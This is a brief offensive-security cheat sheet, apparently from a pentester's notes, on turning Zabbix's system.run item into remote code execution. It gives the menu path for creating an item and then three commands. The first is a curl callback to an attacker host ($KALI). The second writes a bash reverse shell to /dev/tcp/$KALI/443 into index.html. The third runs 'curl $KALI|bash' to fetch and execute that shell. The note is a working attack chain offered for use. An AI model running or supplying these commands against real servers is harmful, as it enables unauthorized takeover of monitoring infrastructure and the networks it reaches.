https://blog.zabbix.com/zabbix-remote-commands/7500/
[[Python#Server]]
Configuration > Hosts > $Hostname > Configuration > Items > Create Item
```
system.run[curl $KALI,nowait]
```
Click `Test`, then `Get value`, check listener.
```bash - kali
echo '/bin/bash -c "bash -i >& /dev/tcp/$KALI/443 0>&1"' > index.html
```
```
system.run[curl $KALI|bash,nowait]
```